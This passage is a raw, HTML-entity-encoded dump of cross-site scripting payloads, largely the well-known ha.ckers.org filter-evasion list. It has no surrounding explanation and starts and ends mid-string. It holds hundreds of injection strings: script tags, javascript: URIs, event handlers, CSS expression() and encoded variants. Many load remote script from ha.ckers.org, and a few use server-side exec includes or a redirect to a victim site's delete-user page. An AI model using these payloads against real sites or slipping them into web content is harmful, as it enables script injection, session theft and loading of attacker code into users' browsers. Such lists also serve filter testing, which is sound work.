src=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;&lt;&quot;&#x27;;alert(String.fromCharCode(88,83,83))//\\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;&lt;IFRAME SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/IFRAME&gt;&lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a=&quot;&gt;&quot; &#x27;&#x27; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT &quot;a=&#x27;&gt;&#x27;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a=&quot;&gt;&#x27;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;&lt;&quot;&#x27;;alert(String.fromCharCode(88,83,83))//\\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&#x27;;alert(String.fromCharCode(88,83,83))//\\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;?/SCRIPT&gt;&amp;submit.x=27&amp;submit.y=9&amp;cmd=search&lt;script&gt;alert(&quot;hellox worldss&quot;)&lt;/script&gt;&amp;safe=high&amp;cx=006665157904466893121:su_tzknyxug&amp;cof=FORID:9#510&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;&amp;search=10&amp;q=&#x27;;alert(String.fromCharCode(88,83,83))//\\&#x27;;alert%2?8String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode?(88,83,83))//\\&quot;;alert(String.fromCharCode(88,83,83)%?29//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83%?2C83))&lt;/SCRIPT&gt;&amp;submit-frmGoogleWeb=Web+Search&lt;h1&gt;&lt;font color=blue&gt;hellox worldss&lt;/h1&gt;&lt;BODY ONLOAD=alert(&#x27;hellox worldss&#x27;)&gt;&lt;input onfocus=write(XSS) autofocus&gt;&lt;input onblur=write(XSS) autofocus&gt;&lt;input autofocus&gt;&lt;body onscroll=alert(XSS)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;&lt;form&gt;&lt;button formaction=&quot;javascript:alert(XSS)&quot;&gt;lol&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(XSS)//&quot;&gt;&lt;![&gt;&lt;img src=&quot;]&gt;&lt;img src=x onerror=alert(XSS)//&quot;&gt;&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(XSS)//&quot;&gt;&lt;? foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;! foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/ foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;? foo=&quot;&gt;&lt;x foo=&#x27;?&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;&gt;&quot;&gt;&lt;! foo=&quot;[[[Inception]]&quot;&gt;&lt;x foo=&quot;]foo&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;% foo&gt;&lt;x foo=&quot;%&gt;&lt;script&gt;alert(123)&lt;/script&gt;&quot;&gt;&lt;div style=&quot;font-family:&#x27;foo&amp;#10;;color:red;&#x27;;&quot;&gt;LOLLOL&lt;style&gt;*&#123;/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;&#125;&lt;/style&gt;&lt;script&gt;(&#123;0:#0=alert/#0#/#0#(0)&#125;)&lt;/script&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;LOL&lt;script&gt;alert(123)&lt;/script&gt;&lt;/svg&gt;&amp;lt;SCRIPT&amp;gt;alert(/XSS/&amp;#46;source)&amp;lt;/SCRIPT&amp;gt;\\\\&quot;;alert(&#x27;XSS&#x27;);//&amp;lt;/TITLE&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(\\&quot;XSS\\&quot;);&amp;lt;/SCRIPT&amp;gt;&amp;lt;INPUT TYPE=\\&quot;IMAGE\\&quot; SRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;BODY BACKGROUND=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;&amp;gt;&amp;lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&amp;gt;&amp;lt;IMG DYNSRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;&amp;gt;&amp;lt;IMG LOWSRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;&amp;gt;&amp;lt;BGSOUND SRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;BR SIZE=\\&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;\\&quot;&amp;gt;&amp;lt;LAYER SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/scriptlet&amp;#46;html\\&quot;&amp;gt;&amp;lt;/LAYER&amp;gt;&amp;lt;LINK REL=\\&quot;stylesheet\\&quot; HREF=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;LINK REL=\\&quot;stylesheet\\&quot; HREF=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;css\\&quot;&amp;gt;&amp;lt;STYLE&amp;gt;@import&#x27;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;css&#x27;;&amp;lt;/STYLE&amp;gt;&amp;lt;META HTTP-EQUIV=\\&quot;Link\\&quot; Content=\\&quot;&amp;lt;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;css&amp;gt;; REL=stylesheet\\&quot;&amp;gt;&amp;lt;STYLE&amp;gt;BODY&#123;-moz-binding&amp;#58;url(\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xssmoz&amp;#46;xml#xss\\&quot;)&#125;&amp;lt;/STYLE&amp;gt;&amp;lt;XSS STYLE=\\&quot;behavior&amp;#58; url(xss&amp;#46;htc);\\&quot;&amp;gt;&amp;lt;STYLE&amp;gt;li &#123;list-style-image&amp;#58; url(\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;);&#125;&amp;lt;/STYLE&amp;gt;&amp;lt;UL&amp;gt;&amp;lt;LI&amp;gt;XSS&amp;lt;IMG SRC=&#x27;vbscript&amp;#058;msgbox(\\&quot;XSS\\&quot;)&#x27;&amp;gt;&amp;lt;IMG SRC=\\&quot;mocha&amp;#58;&amp;#91;code&amp;#93;\\&quot;&amp;gt;&amp;lt;IMG SRC=\\&quot;livescript&amp;#058;&amp;#91;code&amp;#93;\\&quot;&amp;gt;ï¿½scriptualert(EXSSE)ï¿½/scriptu&amp;lt;META HTTP-EQUIV=\\&quot;refresh\\&quot; CONTENT=\\&quot;0;url=javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;META HTTP-EQUIV=\\&quot;refresh\\&quot; CONTENT=\\&quot;0;url=data&amp;#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\\&quot;&amp;gt;&amp;lt;META HTTP-EQUIV=\\&quot;refresh\\&quot; CONTENT=\\&quot;0; URL=http&amp;#58;//;URL=javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;lt;IFRAME SRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;&amp;lt;FRAMESET&amp;gt;&amp;lt;FRAME SRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;/FRAMESET&amp;gt;&amp;lt;TABLE BACKGROUND=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;&amp;gt;&amp;lt;TABLE&amp;gt;&amp;lt;TD BACKGROUND=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;&amp;gt;&amp;lt;DIV STYLE=\\&quot;background-image&amp;#58; url(javascript&amp;#058;alert(&#x27;XSS&#x27;))\\&quot;&amp;gt;&amp;lt;DIV STYLE=\\&quot;background-image&amp;#58;\\0075\\0072\\006C\\0028&#x27;\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028&amp;#46;1027\\0058&amp;#46;1053\\0053\\0027\\0029&#x27;\\0029\\&quot;&amp;gt;&amp;lt;DIV STYLE=\\&quot;background-image&amp;#58; url(javascript&amp;#058;alert(&#x27;XSS&#x27;))\\&quot;&amp;gt;&amp;lt;DIV STYLE=\\&quot;width&amp;#58; expression(alert(&#x27;XSS&#x27;));\\&quot;&amp;gt;&amp;lt;STYLE&amp;gt;@im\\port&#x27;\\ja\\vasc\\ript&amp;#58;alert(\\&quot;XSS\\&quot;)&#x27;;&amp;lt;/STYLE&amp;gt;&amp;lt;IMG STYLE=\\&quot;xss&amp;#58;expr/*XSS*/ession(alert(&#x27;XSS&#x27;))\\&quot;&amp;gt;&amp;lt;XSS STYLE=\\&quot;xss&amp;#58;expression(alert(&#x27;XSS&#x27;))\\&quot;&amp;gt;exp/*&amp;lt;A STYLE=&#x27;no\\xss&amp;#58;noxss(\\&quot;*//*\\&quot;);xss&amp;#58;ex&amp;#x2F;*XSS*//*/*/pression(alert(\\&quot;XSS\\&quot;))&#x27;&amp;gt;&amp;lt;STYLE TYPE=\\&quot;text/javascript\\&quot;&amp;gt;alert(&#x27;XSS&#x27;);&amp;lt;/STYLE&amp;gt;&amp;lt;STYLE&amp;gt;&amp;#46;XSS&#123;background-image&amp;#58;url(\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;);&#125;&amp;lt;/STYLE&amp;gt;&amp;lt;A CLASS=XSS&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;STYLE type=\\&quot;text/css\\&quot;&amp;gt;BODY&#123;background&amp;#58;url(\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;)&#125;&amp;lt;/STYLE&amp;gt;&amp;lt;!--&amp;#91;if gte IE 4&amp;#93;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(&#x27;XSS&#x27;);&amp;lt;/SCRIPT&amp;gt;&amp;lt;!&amp;#91;endif&amp;#93;--&amp;gt;&amp;lt;BASE HREF=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;);//\\&quot;&amp;gt;&amp;lt;OBJECT TYPE=\\&quot;text/x-scriptlet\\&quot; DATA=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/scriptlet&amp;#46;html\\&quot;&amp;gt;&amp;lt;/OBJECT&amp;gt;&amp;lt;OBJECT classid=clsid&amp;#58;ae24fdae-03c6-11d1-8b76-0080c744f389&amp;gt;&amp;lt;param name=url value=javascript&amp;#058;alert(&#x27;XSS&#x27;)&amp;gt;&amp;lt;/OBJECT&amp;gt;&amp;lt;EMBED SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;swf\\&quot; AllowScriptAccess=\\&quot;always\\&quot;&amp;gt;&amp;lt;/EMBED&amp;gt;&amp;lt;EMBED SRC=\\&quot;data&amp;#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\\&quot; type=\\&quot;image/svg+xml\\&quot; AllowScriptAccess=\\&quot;always\\&quot;&amp;gt;&amp;lt;/EMBED&amp;gt;a=\\&quot;get\\&quot;;b=\\&quot;URL(\\\\&quot;\\&quot;;c=\\&quot;javascript&amp;#058;\\&quot;;d=\\&quot;alert(&#x27;XSS&#x27;);\\\\&quot;)\\&quot;;eval(a+b+c+d);&amp;lt;HTML xmlns&amp;#58;xss&amp;gt;&amp;lt;?import namespace=\\&quot;xss\\&quot; implementation=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;htc\\&quot;&amp;gt;&amp;lt;xss&amp;#58;xss&amp;gt;XSS&amp;lt;/xss&amp;#58;xss&amp;gt;&amp;lt;/HTML&amp;gt;&amp;lt;XML ID=I&amp;gt;&amp;lt;X&amp;gt;&amp;lt;C&amp;gt;&amp;lt;!&amp;#91;CDATA&amp;#91;&amp;lt;IMG SRC=\\&quot;javas&amp;#93;&amp;#93;&amp;gt;&amp;lt;!&amp;#91;CDATA&amp;#91;cript&amp;#58;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;#93;&amp;#93;&amp;gt;&amp;lt;/C&amp;gt;&amp;lt;/X&amp;gt;&amp;lt;/xml&amp;gt;&amp;lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&amp;gt;&amp;lt;/SPAN&amp;gt;&amp;lt;XML ID=\\&quot;xss\\&quot;&amp;gt;&amp;lt;I&amp;gt;&amp;lt;B&amp;gt;&amp;lt;IMG SRC=\\&quot;javas&amp;lt;!-- --&amp;gt;cript&amp;#58;alert(&#x27;XSS&#x27;)\\&quot;&amp;gt;&amp;lt;/B&amp;gt;&amp;lt;/I&amp;gt;&amp;lt;/XML&amp;gt;&amp;lt;SPAN DATASRC=\\&quot;#xss\\&quot; DATAFLD=\\&quot;B\\&quot; DATAFORMATAS=\\&quot;HTML\\&quot;&amp;gt;&amp;lt;/SPAN&amp;gt;&amp;lt;XML SRC=\\&quot;xsstest&amp;#46;xml\\&quot; ID=I&amp;gt;&amp;lt;/XML&amp;gt;&amp;lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&amp;gt;&amp;lt;/SPAN&amp;gt;&amp;lt;HTML&amp;gt;&amp;lt;BODY&amp;gt;&amp;lt;?xml&amp;#58;namespace prefix=\\&quot;t\\&quot; ns=\\&quot;urn&amp;#58;schemas-microsoft-com&amp;#58;time\\&quot;&amp;gt;&amp;lt;?import namespace=\\&quot;t\\&quot; implementation=\\&quot;#default#time2\\&quot;&amp;gt;&amp;lt;t&amp;#58;set attributeName=\\&quot;innerHTML\\&quot; to=\\&quot;XSS&amp;lt;SCRIPT DEFER&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/SCRIPT&amp;gt;\\&quot;&amp;gt;&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&amp;lt;SCRIPT SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;jpg\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;!--#exec cmd=\\&quot;/bin/echo &#x27;&amp;lt;SCR&#x27;\\&quot;--&amp;gt;&amp;lt;!--#exec cmd=\\&quot;/bin/echo &#x27;IPT SRC=http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js&amp;gt;&amp;lt;/SCRIPT&amp;gt;&#x27;\\&quot;--&amp;gt;&amp;lt;? echo(&#x27;&amp;lt;SCR)&#x27;;echo(&#x27;IPT&amp;gt;alert(\\&quot;XSS\\&quot;)&amp;lt;/SCRIPT&amp;gt;&#x27;); ?&amp;gt;&amp;lt;IMG SRC=\\&quot;http&amp;#58;//www&amp;#46;thesiteyouareon&amp;#46;com/somecommand&amp;#46;php?somevariables=maliciouscode\\&quot;&amp;gt;Redirect 302 /a&amp;#46;jpg http&amp;#58;//victimsite&amp;#46;com/admin&amp;#46;asp&amp;deleteuser&amp;lt;META HTTP-EQUIV=\\&quot;Set-Cookie\\&quot; Content=\\&quot;USERID=&amp;lt;SCRIPT&amp;gt;alert(&#x27;XSS&#x27;)&amp;lt;/SCRIPT&amp;gt;\\&quot;&amp;gt;&amp;lt;HEAD&amp;gt;&amp;lt;META HTTP-EQUIV=\\&quot;CONTENT-TYPE\\&quot; CONTENT=\\&quot;text/html; charset=UTF-7\\&quot;&amp;gt; &amp;lt;/HEAD&amp;gt;+ADw-SCRIPT+AD4-alert(&#x27;XSS&#x27;);+ADw-/SCRIPT+AD4-&amp;lt;SCRIPT a=\\&quot;&amp;gt;\\&quot; SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;SCRIPT =\\&quot;&amp;gt;\\&quot; SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;SCRIPT a=\\&quot;&amp;gt;\\&quot; &#x27;&#x27; SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;SCRIPT \\&quot;a=&#x27;&amp;gt;&#x27;\\&quot; SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;SCRIPT a=`&amp;gt;` SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;SCRIPT a=\\&quot;&amp;gt;&#x27;&amp;gt;\\&quot; SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;SCRIPT&amp;gt;document&amp;#46;write(\\&quot;&amp;lt;SCRI\\&quot;);&amp;lt;/SCRIPT&amp;gt;PT SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//66&amp;#46;102&amp;#46;7&amp;#46;147/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//1113982867/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//0x42&amp;#46;0x0000066&amp;#46;0x7&amp;#46;0x93/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//0102&amp;#46;0146&amp;#46;0007&amp;#46;00000223/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;htt p&amp;#58;//6 6&amp;#46;000146&amp;#46;0x7&amp;#46;147/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;//www&amp;#46;google&amp;#46;com/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;//google\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org@google\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//google&amp;#58;ha&amp;#46;ckers&amp;#46;org\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//google&amp;#46;com/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//www&amp;#46;google&amp;#46;com&amp;#46;/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;javascript&amp;#058;document&amp;#46;location=&#x27;http&amp;#58;//www&amp;#46;google&amp;#46;com/&#x27;\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//www&amp;#46;gohttp&amp;#58;//www&amp;#46;google&amp;#46;com/ogle&amp;#46;com/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;%3C&amp;lt&amp;lt;&amp;LT&amp;LT;&amp;#60&amp;#060&amp;#0060&amp;#00060&amp;#000060&amp;#0000060&amp;lt;&amp;#x3c&amp;#x03c&amp;#x003c&amp;#x0003c&amp;#x00003c&amp;#x000003c&amp;#x3c;&amp;#x03c;&amp;#x003c;&amp;#x0003c;&amp;#x00003c;&amp;#x000003c;&amp;#X3c&amp;#X03c&amp;#X003c&amp;#X0003c&amp;#X00003c&amp;#X000003c&amp;#X3c;&amp;#X03c;&amp;#X003c;&amp;#X0003c;&amp;#X00003c;&amp;#X000003c;&amp;#x3C&amp;#x03C&amp;#x003C&amp;#x0003C&amp;#x00003C&amp;#x000003C&amp;#x3C;&amp;#x03C;&amp;#x003C;&amp;#x0003C;&amp;#x00003C;&amp;#x000003C;&amp;#X3C&amp;#X03C&amp;#X003C&amp;#X0003C&amp;#X00003C&amp;#X000003C&amp;#X3C;&amp;#X03C;&amp;#X003C;&amp;#X0003C;&amp;#X00003C;&amp;#X000003C;\\x3c\\x3C\\u003c\\u003C&amp;lt;iframe src=http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/scriptlet&amp;#46;html&amp;gt;&amp;lt;IMG SRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;&amp;lt;SCRIPT SRC=//ha&amp;#46;ckers&amp;#46;org/&amp;#46;js&amp;gt;&amp;lt;SCRIPT SRC=http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js?&amp;lt;B&amp;gt;&amp;lt;&amp;lt;SCRIPT&amp;gt;alert(\\&quot;XSS\\&quot;);//&amp;lt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;SCRIPT/SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;BODY onload!#$%&amp;()*~+-_&amp;#46;,&amp;#58;;?@&amp;#91;/|\\&amp;#93;^`=alert(\\&quot;XSS\\&quot;)&amp;gt;&amp;lt;SCRIPT/XSS SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;IMG SRC=\\&quot; javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;perl -e &#x27;print \\&quot;&amp;lt;SCR\\0IPT&amp;gt;alert(\\\\&quot;XSS\\\\&quot;)&amp;lt;/SCR\\0IPT&amp;gt;\\&quot;;&#x27; &amp;gt; outperl -e &#x27;print \\&quot;&amp;lt;IMG SRC=java\\0script&amp;#058;alert(\\\\&quot;XSS\\\\&quot;)&amp;gt;\\&quot;;&#x27; &amp;gt; out&amp;lt;IMG SRC=\\&quot;jav&amp;#x0D;ascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;IMG SRC=\\&quot;jav&amp;#x0A;ascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;IMG SRC=\\&quot;jav&amp;#x09;ascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&amp;gt;&amp;lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&amp;gt;&amp;lt;IMG SRC=javascript&amp;#058;alert(&#x27;XSS&#x27;)&amp;gt;&amp;lt;IMG SRC=javascript&amp;#058;alert(String&amp;#46;fromCharCode(88,83,83))&amp;gt;&amp;lt;IMG \\&quot;\\&quot;\\&quot;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(\\&quot;XSS\\&quot;)&amp;lt;/SCRIPT&amp;gt;\\&quot;&amp;gt;&amp;lt;IMG SRC=`javascript&amp;#058;alert(\\&quot;RSnake says, &#x27;XSS&#x27;\\&quot;)`&amp;gt;&amp;lt;IMG SRC=javascript&amp;#058;alert(&amp;quot;XSS&amp;quot;)&amp;gt;&amp;lt;IMG SRC=JaVaScRiPt&amp;#058;alert(&#x27;XSS&#x27;)&amp;gt;&amp;lt;IMG SRC=javascript&amp;#058;alert(&#x27;XSS&#x27;)&amp;gt;&amp;lt;IMG SRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;SCRIPT SRC=http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js&amp;gt;&amp;lt;/SCRIPT&amp;gt;&#x27;&#x27;;!--\\&quot;&amp;lt;XSS&amp;gt;=&amp;&#123;()&#125;&#x27;;alert(String&amp;#46;fromCharCode(88,83,83))//\\&#x27;;alert(String&amp;#46;fromCharCode(88,83,83))//\\&quot;;alert(String&amp;#46;fromCharCode(88,83,83))//\\\\&quot;;alert(String&amp;#46;fromCharCode(88,83,83))//--&amp;gt;&amp;lt;/SCRIPT&amp;gt;\\&quot;&amp;gt;&#x27;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(String&amp;#46;fromCharCode(88,83,83))&amp;lt;/SCRIPT&amp;gt;&#x27;;alert(String.fromCharCode(88,83,83))//\\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&#x27;&#x27;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;&lt;IMG SRC=javascrscriptipt:alert(&#x27;XSS&#x27;)&gt;&lt;IMG SRC=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;&lt;IMG 